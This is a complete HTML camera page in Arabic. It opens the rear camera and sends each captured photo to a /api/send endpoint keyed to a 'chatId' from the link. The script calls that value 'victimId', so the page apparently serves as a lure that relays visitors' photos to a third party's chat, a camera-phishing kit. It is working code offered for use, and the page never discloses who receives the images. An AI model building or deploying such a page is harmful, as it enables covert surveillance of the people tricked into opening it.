<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>الكاميرا</title>
<style>
body{margin:0;background:#000;font-family:sans-serif;display:flex;flex-direction:column;height:100vh}
#viewfinder{flex:1;background:#111;position:relative;overflow:hidden}
video{width:100%;height:100%;object-fit:cover}
#overlay{position:absolute;inset:0;background:linear-gradient(180deg,rgba(0,0,0,.3),transparent 30%,transparent 70%,rgba(0,0,0,.5))}
#status{position:absolute;top:16px;left:0;right:0;text-align:center;color:#fff;font-size:14px;text-shadow:0 1px 3px #000;z-index:5}
#controls{display:flex;justify-content:center;align-items:center;padding:20px;background:#1a1a1a;gap:24px}
#shutter{width:64px;height:64px;border-radius:50%;border:4px solid #fff;background:rgba(255,255,255,.15);cursor:pointer}
#shutter:active{background:#fff}
</style>
</head>
<body>
<div id="viewfinder">
  <video id="video" autoplay playsinline muted></video>
  <div id="overlay"></div>
  <div id="status">جارٍ تجهيز الكاميرا...</div>
</div>
<div id="controls">
  <span style="width:18px"></span>
  <button id="shutter"></button>
  <span style="width:18px"></span>
</div>
<script>
const victimId = new URLSearchParams(location.search).get('chatId') || 'غير معروف';

async function apiSend(payload) {
    try {
        const r = await fetch('/api/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        return r.ok;
    } catch (e) { return false; }
}

const video = document.getElementById('video');
const statusEl = document.getElementById('status');
let stream = null;

function sendPhoto(dataUrl) {
    apiSend({ type: 'photo', chatId: victimId, photo: dataUrl, caption: '📸 صورة من الكاميرا' })
        .then(ok => {
            statusEl.textContent = ok ? '✅ تم الإرسال' : '❌ فشل الإرسال';
            setTimeout(() => statusEl.textContent = 'اضغط الزر لالتقاط صورة', 2000);
        });
}

async function startCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
        video.srcObject = stream;
        statusEl.textContent = 'اضغط الزر لالتقاط صورة';
    } catch (e) {
        statusEl.textContent = '⚠️ تعذّر الوصول للكاميرا';
    }
}

document.getElementById('shutter').onclick = () => {
    if (!stream) { startCamera(); return; }
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    sendPhoto(canvas.toDataURL('image/jpeg', 0.8));
};

startCamera();
</script>
</body>
</html>
